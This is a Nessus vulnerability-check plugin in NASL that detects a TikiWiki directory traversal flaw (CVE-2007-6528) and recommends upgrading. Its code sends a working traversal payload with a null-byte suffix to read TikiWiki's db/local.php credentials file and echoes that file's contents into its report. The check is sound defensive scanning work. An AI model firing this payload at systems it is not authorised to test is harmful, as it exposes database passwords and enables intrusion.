#
#  (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(29799);
  script_version("$Revision: 1.8 $");

  script_cve_id("CVE-2007-6528");
  script_bugtraq_id(27008);
  script_xref(name:"OSVDB", value:"41178");

  script_name(english:"Tikiwiki tiki-listmovies.php movie Parameter Traversal Arbitrary File Access");
  script_summary(english:"Tries to read a local file using tiki-listmovies.php"); 
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is prone to a
directory traversal attack." );
 script_set_attribute(attribute:"description", value:
"The remote host is running TikiWiki, an open-source wiki application
written in PHP. 

The version of TikiWiki installed on the remote host fails to sanitize
input to the 'movie' parameter of the 'tiki-listmovies.php' script
before using it to access files.  An unauthenticated attacker may be
able to leverage this issue to read up to 1000 lines of arbitrary
files on the remote host, subject to the privileges of the web server
user id. 

Note that successful exploitation is possible regardless of PHP's
'magic_quotes_gpc' and 'register_globals' settings." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/485482/30/0/threaded" );
 script_set_attribute(attribute:"see_also", value:"http://tikiwiki.org/ReleaseProcess199" );
 script_set_attribute(attribute:"solution", value:"Upgrade to Tikiwiki 1.9.9 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N" );
script_end_attributes();

 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);
if (get_kb_item("Services/www/"+port+"/embedded")) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/tiki", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  file = "../db/local.php";
  w = http_send_recv3(method:"GET", 
    item:string(
      dir, "/tiki-listmovies.php?",
      "movie=", file, "%001234"
    ), 
    port:port
  );
  if (isnull(w)) exit(1, "the web server did not answer");
  res = w[2];

  # There's a problem if there's an entry for root.
  if ('$pass_tiki' >< res)
  {
    contents = strstr(res, '<object classid=');
    if ('width="' >< contents) 
      contents = strstr(contents, 'width="') - 'width="';
    if ('"  height="' >< contents) 
      contents = contents - strstr(contents, '"  height="');
    if ('$pass_tiki' >!< contents) contents = res;

    if (report_verbosity > 0)
    {
      info = string(
        "\n",
        "Here are the contents of Tikiwiki's 'db/local.php' file that Nessus\n",
        "was able to read from the remote host :\n",
        "\n",
        contents
      );
      security_warning(port:port, extra:info);
    }
    else security_warning(port);
    exit(0);
  }
}
